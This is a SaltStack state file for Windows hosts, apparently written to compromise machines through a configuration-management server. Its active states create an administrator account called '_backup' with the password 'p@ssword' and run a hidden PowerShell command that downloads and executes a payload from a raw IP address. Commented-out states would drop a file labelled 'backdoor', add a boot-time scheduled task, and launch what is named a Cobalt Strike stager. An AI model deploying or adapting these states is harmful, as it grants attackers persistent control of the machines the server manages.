_backup:
  user:
    - present
    - fullname:  "Backup Admin Account"
    - password: "p@ssword"
    - groups:
      - Administrators
      - Users

win_state:
  cmd.run:
    - name: "cmd.exe /k powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://158.69.195.248:80/a'))\""
    - cwd: 'C:\'
    - shell: 'windows'

#backdoor:
#  file.manage:
#    - name : C:\ProgramData\a.exe
#    - source : salt://a.exe

#userToBeRemoved:
#  user.absent

#task.create:
#  module.run:
#    -  name:  task.create_task
#    -  m_name:  'FLD1\taskname'
#    -  user_name:  'System'
#    -  force:  'False'
#    -  action_type:  'Execute'
#    -  cmd:  'c:\temp\ok.exe'
#    -  trigger_type:  'OnBoot'
#    -  description:  'Test Task'

#run_cobaltstrike:
#  - cmd.run:
#    - name : "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://158.69.195.248:80/a'))\""
#    - name : "dir"
#    - cwd : C:\
